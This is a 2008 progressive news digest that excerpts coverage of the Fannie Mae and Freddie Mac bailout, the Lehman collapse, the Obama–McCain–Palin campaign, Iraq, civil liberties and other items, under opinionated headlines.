Despite criticism for his role in this debacle , Rubin serves as a Director and Chairman of the Executive Committee . . .
" He sparked controversy in 2001 when he contacted an acquaintance at the Treasury Department and asked if the department could convince bond - rating agencies not to downgrade the corporate debt of Enron , a debtor of Citigroup .
Rubin wanted Enron creditors to lend money to the troubled company for a restructuring of its debt ; a collapse of the energy giant might have serious consequences for financial markets and energy distribution .
The Treasury official refused .
A subsequent congressional staff investigation cleared Rubin of any wrongdoing , but he was still harshly criticized by political opponents .

The natural result of the federal government response that emerged over the weekend around the Lehman Brothers catastrophe is to place the venerable Federal Deposit Insurance Corporation , the government institution that insures the bank deposits of hundreds of millions of Americans , in grave jeopardy .
While Treasury secretary Henry Paulson and others talk about not sinking taxpayers ’ funds into saving Lehman , the real , unstated policy is just the opposite .
It is going to work like this :
As it did with Merrill Lynch , the government ’s approach to the crisis will force commercial banks to swallow troubled Wall Street investment companies , flooding the commercial banks with the lousy junk bonds and faulty mortgages that the investment companies own , and that started this mess to begin with .
More and more commercial banks will find themselves on the edge , and they will turn to the FDIC .
But the FDIC can’t possibly shoulder the growing burden .
At that point , Congress will have to step in and shore up the FDIC .
The deal doubtless will include some version of the S&L bailout , with the creation of a Resolution Trust Company type institution into which the banks can dump the sub - prime mortgages , junk bonds , and the like .
In other words , the public will end up paying for Wall Street ’s financial binge .
And the leaders of the financial community who got us into this expensive mess ?
They ’ll get the traditional golden parachutes and lavish pension arrangements -- huge payoffs for screwing the public .
EVERYTHING YOU ALWAYS WANTED KNOW ABOUT FANNIE MAE AND FREDDY MAC
Adhip Chaudhuri , Al Jazeera - Both Fannie Mae and Freddie Mac are US government " sponsored " home loan banks .
Each of them have formal names , but are primarily known by their nicknames .
In fact , both these institutions prefer to go by their nicknames rather than their official names .
That 's like the US government going by " Uncle Sam " all the time .
Fannie Mae was created by the government in 1938 to guarantee mortgage loans made by private banks .
After the Great Depression , which was characterised by bank failures on the one hand , and substantial losses of income on the part of large number of households on the other , the private mortgage market was providing mortgage loans to too few households .
The objective of the Roosevelt Administration was to restore widespread homeownership , which had become almost an ideology in the United States from early on in the twentieth century .
Thirty years later , in 1968 , the government freed Fannie Mae from its control and privatized it with a Congressional charter .
It became just like any other bank , except that it still did not make mortgage loans directly to the public .
Instead , it bought up what is called the " secondary " market - the mortgages which had already been made by the private banks .
Two years later , in 1970 , the US government created Freddie Mac , an exact duplicate of Fannie Mae .
The reason behind a second institution was that high economic growth of the 1960s had led to rising incomes and the resulting widespread homeownership made just one government sponsored mortgage institution , namely Fannie Mae , unappealingly , if not scarily , large .
Both Fannie Mae and Freddie Mac have been private enterprises since then , up until September 7 , 2008 .
They have stockholders who provide the equity capital , they both sell bonds to raise funds , and they both pay for their operations out of their profits .
There has been no money paid by the American taxpayers to these two institutions .
The two were " sponsored " banks , meaning that there was an implicit guarantee from the US government that it would not allow these two institutions to fail .
The principal act that Fannie Mae and Freddie Mac are mandated to do is to buy mortgages from private banks .
The private banks , meanwhile , make mortgage loans with the comfort of knowing that they will be able turn around and sell those loans to Fannie Mae and Freddie Mac .
This comfort has two aspects .
First , the banks which make the initial loans in the primary market get their liquidity back when they sell off their mortgages in the secondary market to Fannie Mae and Freddie Mac .
They can , therefore , make fresh mortgages to new customers with the funds they received from selling the previous mortgages , thereby making it possible for greater homeownership .
The second benefit that private banks get from the existence of Fannie Mae and Freddie Mac is that they can offer mortgages to middle class and low income households at affordable interest rates with the sure knowledge that Fannie Mae and Freddie Mac will take those mortgages over .
Where do Fannie Mae and Freddie Mac . . . raise funds first by issuing bonds on Wall Street just like any private company .
Then , in addition , they sell some of their mortgage holdings in the tertiary markets .
They pool together a lot of mortgages and create a marketable security .
These are called mortgage backed securities .
If any household , whose mortgage is part of a MBS , fails to pay its mortgage obligation for , say , a month , then Fannie Mae or Freddie Mac , whoever is the relevant party , will make good the payment to the MBS holder .
Similarly , if there is a foreclosure and the sale price of the distress sale ends up being less than the value of the mortgage , then Fannie Mae and Freddie Mac will make up the difference .
A lot of these MBS are sold in foreign markets , especially to central banks with large US dollar holdings .
The central bank of China is reputed to be holding $ 340 billion worth of MBS .
. .
The overly aggressive primary mortgage lenders knew full well that Fannie Mae and Freddie Mac would have to buy up all the mortgages below the congressional cap of $ 417,000 .
The primary mortgage companies get their profits from commissions and fees per mortgage that they make , and not from the repayments of principal plus interest from the mortgage borrowers , that is , the homeowner .
That is why they were so reckless in their lending - it is a classic case of " moral hazard " .
As the housing prices have plummeted , there have been two problems that have hurt Fannie Mae and Freddie Mac very badly .
First , they have had to make increasing payments to cover the defaults in the MBS which the two institutions have sold .
Second , they have had to set aside reserves for those mortgages in their own portfolios which are " non-performing " , meaning that the borrower cannot keep up with their payments .
These set - aside reserves do not earn any income for the two mortgage institutions and hence , contribute to losses .
As the profitability of Fannie Mae and Freddie Mac decreased , their borrowing costs went up , squeezing the interest rate differential between what they earn from the mortgages they hold and the rate they have to pay on the bonds that they issue .
Fannie Mae and Freddie Mac did not help themselves during the crisis much either .
They did not implement the guidelines they normally impose on the primary mortgage lenders , but instead they accepted many bad mortgages including " sub - prime " mortgages .
" Sub - prime " mortgages refer to those loans which were made without the necessary information on the borrowers .
For example , a " sub - prime " mortgage may not require borrowers to disclose their incomes .
In addition the two institutions followed highly spurious accounting concepts to overstate their capital base .
And lastly , they continued paying their top executives obscenely high salaries , even when their stock values fell by 80 per cent .
Legally speaking , the US government has put the two institutions under its " conservatorship " .
It 's not clear what exactly does that mean .
The following is what we know now :
The US government will immediately take hold of $ 1 billion worth of equity in each of the institutions .
These will be in the form of preferred stocks with a guaranteed 10 per cent rate of return .
These $ 1 billion infusions are however , not real cash infusions but rather , just compensation for the privilege of being expropriated by the US government .
The government has allowed itself to infuse as much as $ 100 billion to each of the institutions , and thus the American tax payers could be out $ 200 billion by the time the housing crisis plays itself out .
The savings and loan crisis cost the tax payers $ 120 billion .
Presumably , this bail - out will be less expensive .
In addition , all cash infusions by the US government will be more like an investment because they will receive a 10 per cent return .
. .
The Nation - The deal stinks because it does n't really solve anything .
Fannie and Freddie executives got sacked , but nothing substantial was changed in the weirdly illegitimate structure of these private , profit - making corporations sponsored by the federal government .
Instead of acting decisively , the Treasury basically opened the public 's wallet and promised to spend whatever it takes to keep the companies upright .
" Conservatorship " is a fiction .
The taxpayers own these two high - flying turkeys in all but name because they are now picking up the tab .
A real solution to this mess is not complicated : wipe out the corporations and nationalize them , buy out the shareholders for pennies on the dollar and restore Fannie Mae to its original status as a federal housing agency ( maybe merged with Freddie ) .
Its functions involve vital public services -- supporting the flow of mortgage financing , encouraging broader homeownership and subsidizing construction of low - income housing .
These public goods do not much interest private financiers unless they can harvest rip - and - run profits , which is exactly what they did , with their usurious lending in the subprime mortgage scandal .
. .
Instead of rescuing financial losers , the government ought to be devoting its heaviest resources to jump - starting the real economy .
Instead of bailing out the money guys who caused this crisis , Washington should concentrate on bolstering enterprise , employment and productive investment .
Washington has got it backward .
The financial system will not get well and return to normal lending until the economy regains its natural vigor . .
Does Barack Obama or John McCain understand this ?
Neither candidate has acknowledged the enormity of what 's facing the country or explained the dire implications with clarity and frankness , much less described plausible solutions .
McCain is hopeless , mouthing right - wing bromides about corporate tax cuts and smaller government .
Obama has said useful things about financial reforms and has supported some infrastructure funding , but he too has lacked the courage to tell the hard truth about the ditch the country is in and how to get us out .
Obama 's limited comments suggest he sees the crisis much the way Washington does .
That wo n't be good enough if he becomes President -- though a deepening crisis may force him to take bolder action .
Whatever the two candidates claim to believe now , one of them is going to get walloped in January when he enters the Oval Office .
Solari - Originating a great deal more debt than anyone could carry , let alone pay back always ends in failure and bankruptcy of someone or something .
So Fannie and Freddie 's failure or nationalization was always in the cards - it was a matter of when .
If your goal is total centralized control , this is a great way to achieve it .
Between Freddie , Fannie , Ginnie Mae , FHA , VA and the Federal Home Loan Bank Board , the federal government no longer regulates or provides credit to the residential mortgage market - it is the market .
Combined with the digitization of the mortgage credit scoring , origination and servicing process , the implications for privacy and personal freedom are simply stupefying .
And the best part is that this can be described as the government " helping . "

In response to the largest de facto nationalization in US history , we have this example of Governor Palin 's comprehension of this issue : " The fact is that Fannie Mae and Freddie Mac have gotten too big and too expensive to the taxpayers .
The McCain - Palin administration will make them smaller and smarter and more effective for homeowners who need help . " . . .
I would have hoped to have more comprehension from a candidate at a time when the estimate of a resulting $ 300 billion taxpayer liability is viewed as plausible .
Financial Times , UK -
The US began to face the financial consequences of the bail - out of Fannie Mae and Freddie Mac after Congress 's budget watchdog said the housing giants ' operations should sit on the government 's books and the cost of insuring against a US default crept higher .
With the stock market tumbling , the non-partisan Congressional Budget Office said the government takeover of Fannie and Freddie meant the companies should no longer be regarded as outside the public . . .
Peter Orszag , CBO director , said : " It is the CBO view that Fannie Mae and Freddie Mac should be directly incorporated into the federal budget . "
The Bush administration appeared to be caught by surprise .
A spokeswoman for the Office of Management and Budget told the Financial Times : " We are working through this issue with Treasury and other stakeholders . "
The White House could take a different view on Fannie and Freddie and exclude them from its budgets .
But this would be difficult because the CBO is regarded as the leading independent authority on US finances and its assessments guide spending decisions by Congress .
The two mortgage companies have between them $ 5,400bn in liabilities , equal to the entire publicly traded debt of the US , alongside mortgage - related assets of about equal value .
These will now all be accounted for by the CBO , although public accounting rules mean that its tally of US government debt may not necessarily increase by $ 5,400bn .
Guardian UK -
These two strange , gargantuan financial bodies could not have been born in Britain and they could not have been saved in Britain .
They carried in their DNA both the old idealism of FDR's New Deal ( established in 1938 , Fannie Mae was a government agency for its first 30 years ) and a much more modern and toxic capacity to bring the world financial system to its knees .
Without the US government 's decision to take control - nationalisation in all but name - and to inject up to $ 100bn into each , the downturn could have slumped into depression .
This rescue had to happen .
. .
At great cost , American taxpayers have defused a bomb whose imminent detonation might have caused intercontinental financial ruin .
But all that has been gained is time .
The world still needs to work out what should happen next .

Robert Scheer , San Fracisco Chronicle -
The housing bubble was the result of the Ponzi - scheme antics of those other financial entities : commercial banks , stockbrokers and hedge funds , which were allowed in a GOP - deregulated market to get into the " swap " business .
Through the rampant reselling of loans , the obligation to collect on a loan was divorced from the act of selling it in the first place , so who cared if the recipient of the loan was not at all qualified or the appraisal of the property value was inflated , as long as the paper was traded away , or insured , before the moment of foreclosure ?
As with any Ponzi scheme , the perps , who include the legislators as well as the bankers who exploited the loopholes they provided , expected to bail long before the bubble burst .
The role of the legislators , Republican - led but with far too many Democratic running dogs , was critical to the success of the scam .
The mortgage swaps distancing the originator of the loan from the ultimate collector were only made legal as a result of the Commodity Futures Modernization Act that former Texas Republican Sen .
Phil Gramm pushed through Congress just hours before the 2000 Christmas recess .
Gramm , until recently co-chair of the McCain campaign , also had co-authored the Gramm - Leach - Bliley Act that became law in 1999 , with President Bill Clinton 's signature .
That gem , which Gramm had pushed for years with massive financial industry lobbying , destroyed the Depression - era barrier to the merger of stockbrokers , banks and insurance companies .
Those two acts effectively ended significant regulation of the financial community , and no wonder we have witnessed an even more rapid and severe meltdown in housing values than during the Great Depression . .
Amazingly , the turmoil in the housing market , which has led to the socialization of the nation 's revered homeownership market in a massive expansion of the role of big government , has apparently not troubled McCain 's conservative supporters .
CNN - Freddie CEO Richard Syron and Fannie CEO Daniel Mudd will no longer run the agencies , while the FHFA will assume control of the boards .
Regulators took care not to foist blame on the two executives , adding that they would stick around to help with the transition .
Syron and Mudd will be replaced by two finance veterans charged with restoring the mortgage titans to health .
Herb Allison , the former chairman and CEO of pension provider TIAA - CREF , will head Fannie Mae.
Allison formerly served as president of Merrill Lynch .
David Moffett , who served as vice chairman and chief financial officer of U.S. Bancorp until early 2007 and then joined the Carlyle Group private - equity firm as a senior adviser , will take over Freddie Mac .
Independent , UK -
The status of Freddie and Fannie was always a tad unclear but that suited all sides .
Borrowers could obtain cheaper funds ( the safety of the US Treasury meant investors would accept a lower interest rate ) and investors had never seen , nor imagined , a default on a Freddie or Fannie bond .
Take that confidence away and you would engineer a further collapse in the US property market , more defaults and more foreclosures .
And in the US , unlike here , these are " non recourse " - when you hand the house keys to the bank you can walk away from the debt .
Great for foolish homebuyers - not so much for banks with burgeoning bad debts , which in turn makes them unable to lend .
And that is bad news for the economy , for jobs and , in a vicious circle , for the real estate market .
The vast quantities of Fannie and Freddie bonds held in just about every life insurance and pension policy and bank balance sheet across the globe would have been effectively trashed , creating more damage to the financial system and to the global economy .
For a lame - duck administration this is a bold move .
Financially and politically it is on the scale of the bail - outs for the City of New York and the Chrysler Corporation under Ronald Reagan and the vast extensions of federal power during the Franklin Roosevelt era .
Ironically , it was the last serious US housing slump that led Roosevelt to establish Fannie Mae as a government agency in 1938 .
It is strange that , in the home of free enterprise , the state should again have to come to the rescue .
But when you 're too big to fail . . .
PALIN LIKES SOME EARMARKS
TPM Muckraker - Sarah Palin was not quite as conservative as she claims in her requests for earmarks .
And here 's a great example from just this year .
According to Alaska 's 2009 catalog of earmark requests the state 's sea life are in great need of federal money .
As Politico points out , Palin 's office requested $ 2 million in federal monies to study crab mating habits ; $ 494,900 for the recreational halibut harvest and $ 3.2 million for seal genetics research .
Those requests for the study of wildlife genetics and mating habits seems pretty antithetical to the long - standig views of Palin 's running mate , John McCain .
" We 're not going to spend $ 3 million of your tax dollars to study the DNA of bears in Montana , " McCain said earlier this year , referring to a request from Montana for federal money to study the endangered grizzly bear .

GOP RIGGING FLORIDA ELECTION AGAIN
Miami Herald - State elections officials will resume enforcement of a controversial state law that requires Floridians to have their identification match up with a state or federal database in order to register to vote .
Secretary of State Kurt Browning sent notice to the state 's 67 supervisors of elections that the 2006 law , which has been on hold for the last year pending court rulings , would take effect again .
The result is that voters whose identification does n't match with state files on Election Day will be given a provisional ballot and two days to prove their identity for their ballot to count .
Voting rights activists , who had unsuccessfully challenged the constitutionality of the law , blasted the decision , saying it allows the state to rely on what they consider error - prone databases in the month before voter registration ends on Oct.
6 .
" This 11th - hour decision is an ill - advised move to apply a policy the state has never enforced in its current form , at a time when registration activity is at its highest , said Alvaro Fernandez of the Southwest Voter Registration and Education Project , a plaintiff in the case along with the NAACP and the Haitian - American Grassroots Coalition . .
The law , passed by the Republican - led legislature in 2005 , requires Floridians registering to vote to supply a drivers license number or the last four digits of their social security number .
Proponents of the law say it was needed to prevent voter fraud .
. .
Elizabeth Westfall , senior attorney with the Washington , D.C. - based Advancement Project , a civil rights group , said that when the law was in effect in 2006 and 2007 , it disproportionately excluded Latino and African American voters who often had double last names that often did n't register accurately in the data files .
The civil rights groups sued the state in September 2007 , won an injunction in December and the state won a reversal on appeal in June in federal district court in Atlanta .
The ruling became final on July 28 and was not enforced during registration for the Aug. 26 primary .
Westfall says to enforce the law now " creates quite a bit of chaos and needless disenfranchisement . "
PALIN THINKS HUBRIS IS JUST FINE
Charles Gibson aked Palin if she did n't hesitate and question whether she was experienced enough .
" I did n't hesitate , no , " she said .
He asked if that did n't that take some hubris .
" I answered [ McCain ] yes , " Ms. Palin said , " because I have the confidence in that readiness and knowing that you can't blink , you have to be wired in a way of being so committed to the mission , the mission that we 're on , reform of this country and victory in the war , you can't blink .
So I did n't blink then even when asked to run as his running mate . "
TEN YEAR OLD POTENTIAL TERRORIST STOPPED
Island Packet , NC - A 10 - year - old Hilton Head Island boy has been suspended from school for having something most students carry in their supply boxes : a pencil sharpener .
The problem was his sharpener had broken , but he decided to use it anyway .
A teacher at Hilton Head Island International Baccalaureate Elementary School noticed the boy had what appeared to be a small razor blade during class on Tuesday , according to a Beaufort County sheriff 's report .
It was obvious that the blade was the metal insert commonly found in a child 's small , plastic pencil sharpener , the deputy noted .
The boy -- a fourth - grader described as a well - behaved and good student -- cried during the meeting with his mom , the deputy and the school 's assistant principal .
He had no criminal intent in having the blade at school , the sheriff 's report stated , but was suspended for at least two days and could face further disciplinary action .
BUSH SHIFTS BLAME FOR 9/11
Think Progress -
In a press conference , a reporter asked White House Press Secretary Dana Perino about the administration 's ongoing efforts to find Osama bin Laden , calling him the " mastermind " of 9/11 .
Perino interrupted the reporter , claiming bin Laden was not the true " mastermind " of the attacks :
Q : But Osama bin Laden is the one that - you keep talking about his lieutenants , and , yes , they are very important , but Osama bin Laden was the mastermind of 9/11 ¬
PERINO : No , Khalid Sheikh Mohammed was the mastermind of 9/11 , and he 's sitting in jail right now .
Perino seems to be attempting to justify the White House 's failure to catch bin Laden by suggesting he was not the " mastermind . "
But in September 2006 , former press secretary Tony Snow stated :
" Osama bin Laden , mastermind of September 11th , the person that many people talk about and still have concerns about , calls this fight , the fight in Iraq , ' the third world war . ' "
While Khalid Sheikh Mohammed has admitted to being the ' architect ' of 9/11 , bin Laden was not inconsequential ; he approved and executed the attacks .
KSM in fact , brought the idea to bin Laden , who according to the 9/11 Commission , " wanted to hit the White House , Pentagon and U.S. Capitol , " not just the World Trade Center .
Perino suggested that it would take " superpowers " to catch bin Laden .
" So there are human limitations to any - this is not the movies , we do n't have superpowers , " she said .
It did n't , however , take " superpowers " to capture bin Laden at Tora Bora in late 2001 , where he escaped in part because of a lack of troops .
OBAMA HINTS RETURN OF DRAFT
World Socialist -
In remarks that clearly pointed toward the restoration of the military draft under an Obama administration , the Democratic candidate said that his job as president would include demanding that the American people recognize an " obligation " for military service .
" If we are going into war , then all of us go , not just some , " Senator Barack Obama declared .
Obama 's comments came as he and his Republican opponent , Senator John McCain , took part in a forum on national service at Columbia University in New York City .
Earlier in the day , both candidates joined in a memorial service at the site of the World Trade Center , commemorating the victims of the 9/11 terrorist attacks .
While " national service " encompasses more than the military , including such government - run programs as the Peace Corps , Americorps and Teach for America , as well as private and religious programs , both McCain and Obama focused on expanding the US Armed Forces as a major goal of the next administration , whether Democratic or Republican .
In an indication of the bipartisan support for the increasing militarization of American society , McCain jokingly offered to name Obama his coordinator for national service if the Republican were to win the election , and Obama reciprocated .
The forum was co-hosted by Judy Woodruff of the Public Broadcasting Service and Richard Stengel , editor of Time magazine .
Woodruff introduced Stengel as the man responsible for the magazine 's 2007 cover story , " The Case for National Service , " which Woodruff said had " ignited this movement . " . . .
Obama [ made ] his most direct statement of the campaign about expanding military service , declaring : " But it 's also important that a president speaks to military service as an obligation not just of some , but of many .
You know , I traveled , obviously , a lot over the last 19 months .
And if you go to small towns , throughout the Midwest or the Southwest or the South , every town has tons of young people who are serving in Iraq and Afghanistan .
That 's not always the case in other parts of the country , in more urban centers .
And I think it 's important for the president to say , this is an important obligation .
If we are going into war , then all of us go , not just some . " . . .
In political terms , Obama 's appearance at Columbia was aimed at demonstrating to the American political establishment that he is prepared to reject any pressure from antiwar college students , who are a major component of his campaign 's personnel and volunteers .
To that end , Obama not only called for expanded military service , he directly attacked the exclusion of the Reserve Officers Training Corps from many college campuses .
Stengel noted that Columbia had invited President Ahmadinejad of Iran to speak on the campus , but " have n't invited ROTC to be on campus since 1969 . "
Obama replied , " Yes , I think we 've made a mistake on that .
I recognize that there are students here who have differences in terms of military policy .
But the notion that young people here at Columbia or anywhere , in any university , are n't offered the choice , the option of participating in military service , I think is a mistake . "
ROTC became a focus of hostility on hundreds of campuses during the Vietnam War era , and was in many cases banned as a student organization .
These restrictions largely ended after 1975 , but they were continued or reestablished on a handful of campuses after the Clinton administration established the " Do n't ask , do n't tell " policy , reaffirming the longtime Pentagon ban on gays and lesbians serving openly in the military .
Such a ban violates the non-discrimination rules imposed by many campuses on corporate recruiters .
ARMY'S NEW PLAN FOR TROOP MIND CONTROL
Time - Improvements in computing power and a better understanding of how the brain works have scientists busy hunting for the distinctive neural fingerprints that flash through a brain when a person is talking to himself .
The Army 's initial goal is to capture those brain waves with incredibly sophisticated software that then translates the waves into audible radio messages for other troops in the field .
" It 'd be radio without a microphone , " says Dr. Elmar Schmeisser , the Army neuroscientist overseeing the program .
" Because soldiers are already trained to talk in clean , clear and formulaic ways , it would be a very small step to have them think that way . " . . .
The five - year contract it awarded last month to a coalition of sceintists from the University of California at Irvine , Carnegie Mellon University , and the University of Maryland , seeks to " decode the activity in brain networks " so that a soldier could radio commands to one or many comrades by thinking of the message he wanted to relay and who should get it .
Initially , the recipients would most likely hear transmissions rendered by a robotic voice via earphones .
But scientists eventually hope to deliver a version in which commands are rendered in the speaker 's voice and indicate the speaker 's distance and direction from the listener .
" Having a soldier gain the ability to communicate without any overt movement would be invaluable both in the battlefield as well as in combat casualty care , " the Army said in last year 's contract solicitation .
" It would provide a revolutionary technology for silent communication and orientation that is inherently immune to external environmental sound and light . " . . .
Dr. Mike D'Zmura of UC - Irvine , the lead scientist on the project , says his task is akin to finding the right strands on a plate full of pasta .
" You need to pick out the relevant pieces of spaghetti , " he says , " and sometimes they have to be torn apart and re-attached to others . "
But with ever - increasing computing power the task can be done in real time , he says .
Users also will have to be trained to think loudly .
" How do we get a person to think something to themselves in a way that leaves a very strong signal in EEGs that we can read off a
DRUGS : A BUSINESS FOR OUR TIMES
Sam Smith , Progressive Review -
Since there is so much bad financial news these days , we thought this might cheer you up .
The drug business is doing extremely well , thanks in large part to years of de facto subsidy by the perversely misnamed " war on drugs . "
A recent CNN report said the Coast Guard had seized $ 4.7 billion worth of cocaine last year .
That 's only the amount the Coast Guard seized and it's only the value of cocaine , not all the other drugs .
The value is just shy of the $ 4.83 billion Google earned in the last quarter of last year .
At the time Google had about 16,000 employees .
When you are able to lose $ 4.7 billion a year in just one product line and still keep growing , you 've got an impressive business .
Back in 1997 , I interviewed Billy Bear Bottoms , the pilot for one of the biggest drug importers of the time , Barry Seal .
Bottoms told me that Seal had made about 50 trips of 300 kilos each , or approximately 16 tons total .
The Coast Guard recently seized one vessel - a self propelled semi-submersible that costs up to a million bucks to build - and found seven tons on the craft or 21 times as much as the notorious Seal was able to transport on one trip .
Another of this year 's seizures amount to more than Seal was able to import on 50 flights .
One day , and sadly far too late , we will finally learn that the biggest driver of the drug trade is US law enforcement .
ANOTHER BUSH WAR CRIME
Add to the list of Bush war crimes :
It is now been reported by senior American officials that the president secretly told the military to carryn out actions inside Pakistan without the approval of the Pakistani government .
Said one of the officials , " The situation in the tribal areas is not tolerable .
We have to be more assertive .
Orders have been issued . "
MEDIA PUSHES 'SURGE ' MYTH
Robert Parry , Consortium News - Despite strong evidence to the contrary , it has become established conventional wisdom among mainstream Washington journalists that the " surge " was the singular reason for the recent decline in Iraq 's violence .
It 's also agreed that McCain deserves great credit for pushing the " surge " idea early .
Barack Obama has been repeatedly chastised -- even badgered -- for opposing the " surge . "
His attempts to refocus the debate more broadly on the wisdom of invading Iraq in the first place are rudely rejected by Big Media interviewers .
. .
In reality , the " surge " of about 30,000 additional troops sent to Iraq appears to have been only one factor and -- according to military officials interviewed for Bob Woodward 's new book , The War Within -- possibly a secondary one in explaining the drop - off in the violence that had made Iraq a living hell .
. .
Woodward , whose book draws heavily from Pentagon insiders , reported that the Sunni rejection of al - Qaeda extremists in Anbar province ( which preceded the surge ) and the surprise decision of radical Shiite leader Moqtada al - Sadr to order a unilateral cease - fire by his militia were two important factors .
A third factor , which Woodward argued may have been the most significant , was the use of new highly classified U.S. intelligence tactics that allowed for rapid targeting and killing of insurgent leaders .
Woodward agreed to withhold details of these secret techniques from his book so as not to undercut their continuing success . . .
Other brutal factors -- that the Washington press corps almost never mentions -- help explain the decline in violence :
- Vicious ethnic cleansing has succeeded in separating Sunnis and Shiites to such a degree that there are fewer targets to kill .
Several million Iraqis are estimated to be refugees either in neighboring countries or within their own .
- Concrete walls built between Sunni and Shiite areas have made " death - squad " raids more difficult but alshave " cantonized " much of Baghdad and other Iraqi cities , making everyday life for Iraqis even more exhausting as they seek food or travel to work .
- During the " surge , " U.S. forces expanded a policy of rounding up so - called " military age males " and locking up tens of thousands in prison .
- Awesome U.S. firepower , concentrated on Iraqi insurgents and civilian bystanders for more than five years , has slaughtered countless thousands of Iraqis and has intimidated many others to look simply to their own survival .
- With the total Iraqi death toll estimated in the hundreds of thousands and many more Iraqis horribly maimed , the society has been deeply traumatized .
As tyrants have learned throughout history , at some point violent repression does work .
URBAN FASCISM GROWING
Time -
For much of the latter part of summer , police officers in Helena , Ark. , shouldered military - style M - 16 rifles equipped with laser sights and patrolled the streets of this little community of 15,000 .
White signs on large blue barrels were placed in a 10 - block area , warning that it was under 24 - hour curfew .
" Everybody is subject to being stopped and questioned , " said Mayor James Valley .
" Our officers will ride in unmarked vehicles , pull surprises on people and check everybody out to see who they are . "
A crime spree prompted a similar lockdown in Hartford , Conn .
After a chain of shootings that left one 21 - year - old dead , a 15 - month - old shot in the left leg and six young people wounded , the city in August imposed a 30 - day emergency curfew on everyone under the age of 18 .
Mayor Eddie Perez said in a statement : " We must do this because we cannot and will not tolerate innocent people , especially children , to be victims . "
A growing number of U.S. towns and cities are fighting escalating crime by imposing tough curfew ordinances .
In Chicago , people under the age of 17 have to be off the streets by 10 p.m. on weekdays and 11 p.m. on weekends .
Mayor Richard Daley believes the ordinance will help prevent further gun crime , which has taken the lives of nearly 30 Chicago public school students this academic year alone .
But while the curfews may be popular with voters , civil - rights advocates argue that they are violating constitutional rights .
Curfews " essentially place an entire demographic under house arrest for the inappropriate actions of a few , " says David McGuire , an American Civil Liberties Union attorney in Connecticut .
Restricting citizens to their home during certain hours of the day , he and others argue , violates the right to assemble , the right to travel freely and other basic due process rights protected by the 14th Amendment .
. .
Curfew laws have been struck down by courts in New Jersey , Washington and California but upheld in Texas and the District of Columbia .
They continue to be debated in several jurisdictions .
Yet the constitutionality of youth curfew laws has yet to be tested in front of the U.S. Supreme Court .
STUPID SCHOOL SUPERINTENDENT
TRICKS
Dozens of students at Mashwood High School in South Berwick ME staged a sit in to protest the school 's ban on backpacks .
The superintendent wo n't budge arguing that the ban improves school safety , reduces classroom clutter and lessens the stress on the students ' backs .
MORE CYCLISTS MEAN FEWER ACCIDENTS
Ecomodder -
It may seem counterintuitive , but according to a recent report more cyclists on the road mean fewer accidents involving cyclists and motor vehicles .
. .
" It 's a virtuous cycle , " says Dr Julie Hatfield , an injury expert from University of New South Wales .
" The likelihood that an individual cyclist will be struck by a motorist falls with increasing rate of bicycling in a community .
And the safer cycling is perceived to be , the more people are prepared to cycle . "
Also , even more encouragingly , it does n't seem that cycling infrastructure is responsible for the change :
Experts say the effect is independent of improvements in cycling - friendly laws such as lower speed limits and better infrastructure , such as bike paths .
Research has revealed the safety - in - numbers impact for cyclists in Australia , Denmark , the Netherlands , 14 European countries and 68 Californian cities .
FEDERAL COURT : CELL PHONES COVERED BY FOURTH AMENDMENT
Electronic Frontier Foundation -
In an unprecedented victory for cell phone privacy , a federal court has affirmed that cell phone location information stored by a mobile phone provider is protected by the Fourth Amendment and that the government must obtain a warrant based on probable cause before seizing such records .
The Department of Justice had asked the federal court in the Western District of Pennsylvania to overturn a magistrate judge 's decision requiring the government to obtain a warrant for stored location data , arguing that the government could obtain such information without probable cause .
The Electronic Frontier Foundation , at the invitation of the court , filed a friend - of - the - court brief opposing the government 's appeal and arguing that the magistrate was correct to require a warrant .
The court agreed with EFF and issued an order affirming the magistrate 's decision .
EFF has successfully argued before other courts that the government needs a warrant before it can track a cell phone 's location in real - time .
However , this is the first known case where a court has found that the government must also obtain a warrant when obtaining stored records about a cell phone 's location from the mobile phone provider .
VEGETARIANS FACE BRAIN SHRINKAGE
Times of India - Scientists have discovered that going veggie could be bad for your brain - with those on a meat - free diet six times more likely to suffer brain shrinkage .
Vegans and vegetarians are the most likely to be deficient because the best sources of the vitamin are meat , particularly liver , milk and fish .
Vitamin B12 deficiency can also cause anaemia and inflammation of the nervous system .
Yeast extracts are one of the few vegetarian foods which provide good levels of the vitamin .
The link was discovered by Oxford University scientists who used memory tests , physical checks and brain scans to examine 107 people between the ages of 61 and 87 .
When the volunteers were retested five years later the medics found those with the lowest levels of vitamin B12 were also the most likely to have brain shrinkage .
It confirms earlier research showing a link between brain atrophy and low levels of B12 .
Brain scans of more than 1,800 people found that people who downed 14 drinks or more a week had 1.6 % more brain shrinkage than teetotallers .
Women in their seventies were the most at risk .
Beer does less damage than wine according to a study in Alcohol and Alcoholism .
And being overweight or obese is linked to brain loss , Swedish researchers discovered .
Scans of around 300 women found that those with brain shrink had an average body mass index of 27 And for every one point increase in their BMI the loss rose by 13 to 16 % .
GREAT MOMENTS IN CANADIAN POLITICS

QUIET MELTDOWN AT PACIFICA
Greg Guma , Maverick Media -
Two years ago it looked as if Pacifica Radio , the original listener - supported network , was on the road to reconciliation and renewed relevance after a decade of internal warfare .
New national shows had been launched , the number of affiliates was increasing , a mood of collaboration and mutual respect was taking hold , and , in September 2006 , the CFO reported the highest revenues in the organization 's 57 - year history .
A year later , the financial news was less encouraging , but Pacifica was about to hire a new executive director , Nicole Sawaya , returning to Pacifica after nine years with enthusiastic support from the board and community .
Cut to September 2008 .
As Pacifica approaches its 60th anniversary , it faces the most serious organizational and financial crisis in years .
According to several well - placed sources , Sawaya has resigned - for the second time in ten months - effective in early October .
The network is considering budget cuts of more than $ 900,000 , including at least 10 staff positions at stations and possible layoffs from the national staff .
Pacifica is also grappling with the need for multiple bylaw amendments and the high cost of lawsuits .
The national board is split down the middle , the human resources director has left , a line of credit has been secured from Wells Fargo to cover recent expenses , based on a C.D. held by KPFA , and another loan is being sought .
Nevertheless , those waiting for an official announcement , especially concerning personnel changes , would be well - advised not hold their breath .
Although critical of the mainstream media , Pacifica 's managers and Board are often late and consistently coy when the subject is their own internal activities .
Concerned about the staffing implications and potential for panic , recent meetings of the National Finance Committee have been conducted in executive session .
The term " transparency " is used frequently , but , in part due to the crisis , is being selectively applied .
As Sawaya 's predecessor , I 'm not that shocked by recent developments .
Things certainly were n't easy or conflict free during my two years in the job .
But the rapid pace of the decline does raise at least two questions :
How could so much go wrong so fast ?
And , what do Pacifica 's leaders hope to do about it ?
The second question may be answered , at least in part , at the in-person meeting of the Pacifica national board scheduled for next weekend , Sept. 19 - 21 , in Washington , DC
